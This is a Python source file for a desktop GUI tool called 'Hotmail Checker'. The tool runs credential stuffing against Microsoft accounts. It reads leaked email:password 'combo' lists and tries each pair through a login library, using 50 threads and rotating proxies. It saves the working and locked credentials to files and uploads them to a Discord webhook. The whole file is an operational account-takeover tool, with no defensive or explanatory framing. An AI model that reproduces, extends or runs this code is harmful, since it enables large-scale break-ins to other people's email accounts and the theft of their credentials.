import random
import threading
import requests
from mailhub import MailHub
from colorama import init, Fore
from concurrent.futures import ThreadPoolExecutor
import os
import customtkinter as ctk
from tkinter import filedialog, messagebox, Text, END, WORD, NORMAL, DISABLED
import datetime

init(autoreset=True)
mail = MailHub()
write_lock = threading.Lock()

def validate_line(line):
    parts = line.strip().split(":")
    if len(parts) == 2:
        return parts[0], parts[1]
    else:
        return None, None

def attempt_login(email, password, proxy, valid_file, invalid_file):
    try:
        res = mail.loginMICROSOFT(email, password, proxy)[0]
        if res == "ok":
            log_text(f"Valid   | {email}:{password}", "green")
            with write_lock:
                valid_file.write(f"{email}:{password}\n")
                valid_file.flush()
        elif res in ["nfa", "custom"]:
            log_text(f"Locked  | {email}:{password}", "yellow")
            with write_lock:
                invalid_file.write(f"{email}:{password}\n")
                invalid_file.flush()
        else:
            log_text(f"Invalid | {email}:{password}", "red")
    except Exception as e:
        log_text(f"Error   | {email}:{password} - {str(e)}", "red")

def process_combo_file(valid_file_path, invalid_file_path, proxies, combo_path):
    try:
        with open(combo_path, "r", encoding="utf-8", errors="ignore") as file:
            with open(valid_file_path, "a", encoding="utf-8") as valid_file, \
                 open(invalid_file_path, "a", encoding="utf-8") as invalid_file:
                
                with ThreadPoolExecutor(max_workers=50) as executor:
                    futures = []
                    for line in file:
                        email, password = validate_line(line)
                        if email is None or password is None:
                            log_text(f"Invalid format in line: {line.strip()}", "yellow")
                            continue
                        proxy = {"http": f"http://{random.choice(proxies).strip()}"} if proxies else None
                        futures.append(executor.submit(
                            attempt_login, email, password, proxy, valid_file, invalid_file
                        ))
                    for future in futures:
                        future.result()
    except Exception as e:
        log_text(f"Error processing combo file: {e}", "red")

def send_to_discord(file_path, webhook_url, check_type="Valid"):
    if not os.path.exists(file_path) or os.stat(file_path).st_size == 0:
        log_text(f"No {check_type.lower()} hits found to send.", "yellow")
        return
    
    try:
        with open(file_path, 'rb') as file:
            files = {'file': (f'{check_type.lower()}_hits.txt', file)}
            payload = {
                'content': f'{check_type.upper()} HOTMAIL ACCOUNTS\nCount: {sum(1 for _ in open(file_path))}'
            }
            response = requests.post(webhook_url, data=payload, files=files)
            if response.status_code == 200 or response.status_code == 204:
                log_text(f"Successfully sent {check_type.lower()} hits to Discord!", "green")
            else:
                log_text(f"Discord error: {response.status_code} - {response.text}", "red")
    except Exception as e:
        log_text(f"Error sending to Discord: {e}", "red")

def log_text(message, color="white"):
    text_area.config(state=NORMAL)
    if color == "green":
        text_area.insert(END, message + "\n", "green")
    elif color == "red":
        text_area.insert(END, message + "\n", "red")
    elif color == "yellow":
        text_area.insert(END, message + "\n", "yellow")
    else:
        text_area.insert(END, message + "\n")
    text_area.config(state=DISABLED)
    text_area.see(END)
    root.update()

def start_checker():
    combo_path = combo_entry.get()
    webhook_url = webhook_entry.get()
    proxy_path = proxy_entry.get()

    if not combo_path or not os.path.exists(combo_path):
        messagebox.showerror("Error", "Invalid combo file path")
        return

    proxies = []
    if proxy_path:
        if not os.path.exists(proxy_path):
            messagebox.showerror("Error", "Proxy file not found")
            return
        with open(proxy_path, "r") as f:
            proxies = f.readlines()

    timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
    valid_file = f"valid_hits_{timestamp}.txt"
    invalid_file = f"locked_hits_{timestamp}.txt"

    # Disable UI during checking
    start_button.configure(state="disabled")
    combo_entry.configure(state="disabled")
    proxy_entry.configure(state="disabled")
    webhook_entry.configure(state="disabled")

    def run_checker():
        try:
            log_text(f"Starting check with {len(proxies)} proxies..." if proxies else "Starting check without proxies...")
            log_text(f"Valid hits will be saved to: {valid_file}")
            log_text(f"Locked hits will be saved to: {invalid_file}")
            
            process_combo_file(valid_file, invalid_file, proxies, combo_path)
            
            if webhook_url:
                send_to_discord(valid_file, webhook_url, "Valid")
                send_to_discord(invalid_file, webhook_url, "Locked")
            
            log_text("Checking completed!", "green")
            log_text(f"Valid accounts: {sum(1 for _ in open(valid_file))}")
            log_text(f"Locked accounts: {sum(1 for _ in open(invalid_file))}")
        except Exception as e:
            log_text(f"Checker error: {str(e)}", "red")
        finally:
            # Re-enable UI
            start_button.configure(state="normal")
            combo_entry.configure(state="normal")
            proxy_entry.configure(state="normal")
            webhook_entry.configure(state="normal")

    threading.Thread(target=run_checker, daemon=True).start()

def browse_file(entry):
    filename = filedialog.askopenfilename(filetypes=[("Text files", "*.txt")])
    if filename:
        entry.delete(0, END)
        entry.insert(0, filename)

# GUI Setup
root = ctk.CTk()
root.title("Hotmail Checker")
root.geometry("800x600")

ctk.set_appearance_mode("System")
ctk.set_default_color_theme("blue")

# Main frame
main_frame = ctk.CTkFrame(root)
main_frame.pack(fill="both", expand=True, padx=10, pady=10)

# Input fields
ctk.CTkLabel(main_frame, text="Combo File:").grid(row=0, column=0, padx=5, pady=5, sticky="e")
combo_entry = ctk.CTkEntry(main_frame, width=400)
combo_entry.grid(row=0, column=1, padx=5, pady=5)
ctk.CTkButton(main_frame, text="Browse", command=lambda: browse_file(combo_entry)).grid(row=0, column=2, padx=5, pady=5)

ctk.CTkLabel(main_frame, text="Proxy File:").grid(row=1, column=0, padx=5, pady=5, sticky="e")
proxy_entry = ctk.CTkEntry(main_frame, width=400)
proxy_entry.grid(row=1, column=1, padx=5, pady=5)
ctk.CTkButton(main_frame, text="Browse", command=lambda: browse_file(proxy_entry)).grid(row=1, column=2, padx=5, pady=5)

ctk.CTkLabel(main_frame, text="Discord Webhook:").grid(row=2, column=0, padx=5, pady=5, sticky="e")
webhook_entry = ctk.CTkEntry(main_frame, width=400)
webhook_entry.grid(row=2, column=1, padx=5, pady=5)

# Start button
start_button = ctk.CTkButton(main_frame, text="Start Checking", command=start_checker)
start_button.grid(row=3, column=0, columnspan=3, pady=10)

# Log area
text_frame = ctk.CTkFrame(main_frame)
text_frame.grid(row=4, column=0, columnspan=3, sticky="nsew", padx=5, pady=5)

text_area = Text(text_frame, wrap=WORD, state=DISABLED, bg="#343638", fg="white", 
                font=("Consolas", 12), insertbackground="white")
text_area.pack(fill="both", expand=True)

# Configure tags
text_area.tag_configure("green", foreground="#2ecc71")
text_area.tag_configure("red", foreground="#e74c3c")
text_area.tag_configure("yellow", foreground="#f39c12")

# Configure grid weights
main_frame.grid_rowconfigure(4, weight=1)
main_frame.grid_columnconfigure(1, weight=1)

root.mainloop()